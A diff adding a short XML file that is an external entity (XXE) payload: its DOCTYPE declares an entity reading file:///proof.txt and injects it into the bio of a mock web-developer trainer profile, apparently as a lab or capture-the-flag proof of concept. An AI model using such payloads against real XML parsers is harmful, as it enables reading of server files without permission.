@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY trainer SYSTEM "file:///proof.txt">
+]>
+
+<response><id>1</id><name>Robin Marjan</name><proffesion>Web Development</proffesion>
+<bio>&trainer; Robin is a web developer, mentor, and professor who is prominent in his field. He has been working in the industry for over 20 years and has seen it all. He is passionate about mentoring young developers and helping them learn the ropes. When he is not teaching or coding, he enjoys spending time with her family and friends.</bio><imgPath>/assets/img/trainers/1.jpg</imgPath></response>
